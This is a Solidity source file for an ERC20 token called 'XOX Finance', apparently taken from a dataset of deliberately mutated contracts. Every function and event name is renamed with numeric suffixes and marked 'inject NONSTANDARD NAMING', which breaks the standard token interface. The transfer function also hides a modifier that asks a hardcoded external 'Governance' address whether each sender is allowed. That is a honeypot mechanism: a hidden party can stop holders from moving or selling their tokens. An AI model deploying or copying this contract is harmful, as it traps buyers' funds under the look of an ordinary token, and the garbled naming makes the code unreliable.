                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY172() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF721(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER27(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE850(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE445(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM587(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER366(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL407(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function ISPARTNER169(address sender,address addr) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER745() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0x1E689E0D6BBe71D3FdA153F8d99fD412784F4F72;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY172() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF721(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER27(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER372(_MSGSENDER745(), recipient, amount);
        return true;
    }

    function ALLOWANCE850(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE445(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE323(_MSGSENDER745(), spender, amount);
        return true;
    }

    function TRANSFERFROM587(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER372(sender, recipient, amount);
        _APPROVE323(sender, _MSGSENDER745(), _allowances[sender][_MSGSENDER745()].SUB592(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE237(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE323(_MSGSENDER745(), spender, _allowances[_MSGSENDER745()][spender].ADD93(addedValue));
        return true;
    }

    function DECREASEALLOWANCE350(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE323(_MSGSENDER745(), spender, _allowances[_MSGSENDER745()][spender].SUB592(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER372(address sender, address recipient, uint amount) internal ENSURE759(sender) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB592(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD93(amount);
        emit TRANSFER366(sender, recipient, amount);
    }

    function _MINT863(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD93(amount);
        _balances[account] = _balances[account].ADD93(amount);
        emit TRANSFER366(address(0), account, amount);
    }

    function _BURN158(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB592(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB592(amount);
        emit TRANSFER366(account, address(0), amount);
    }

    modifier ENSURE759(address sender) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).ISPARTNER169(sender,address(this)));
        _;
    }

    function _APPROVE323(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL407(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME12() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL105() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS380() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD93(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB592(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB592(a, b, "SafeMath: subtraction overflow");
    }

    function SUB592(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL335(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV920(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV920(a, b, "SafeMath: division by zero");
    }

    function DIV920(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

contract XOX is ERC20, ERC20Detailed {
    constructor() public ERC20Detailed("XOX Finance","XOX",18) {
        _MINT863(msg.sender, 10000 * 10 ** 18);
    }

}